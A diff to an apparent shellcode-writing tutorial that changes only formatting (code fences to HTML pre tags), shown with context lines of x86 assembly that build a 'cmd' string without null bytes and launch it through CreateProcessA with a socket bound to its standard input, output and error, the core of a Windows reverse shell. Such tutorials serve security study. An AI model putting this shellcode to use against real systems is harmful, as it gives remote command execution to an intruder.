@@ -389,7 +389,7 @@ typedef struct _PROCESS_INFORMATION {
 
 
 The following is the assembly for our call to `CreateProcessA(...)`:
-```
+<pre>
 mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
                         ; injecting null bytes.
 shr ebx,0x8             ; Make EBX = 'cmd\x00'
@@ -399,7 +399,7 @@ mov ecx,esp             ; Make ECX a pointer to the 'cmd' command
 
 ; Now fill the `_STARTUPINFOA` structure
 xor edx,edx             ; Zero out EBX
-push esi                ; hStdError = our socket handler
+push esi                ; <b>hStdError</b> = our socket handler
 push esi                ; hStdOutput = our socket handler
 push esi                ; hStdInput = our socket handler
 push edx                ; cbReserved2 = NULL
@@ -446,7 +446,7 @@ push ebx                ; lpApplicationName
 
 mov ebx,0x7594f960      ; Change! Call CreateProcessA()
 call ebx                ; Call CreateProcessA()
-```
+<\pre>
 1) We first allocate a `lpCommandLine` string on the stack.
    ```
    mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
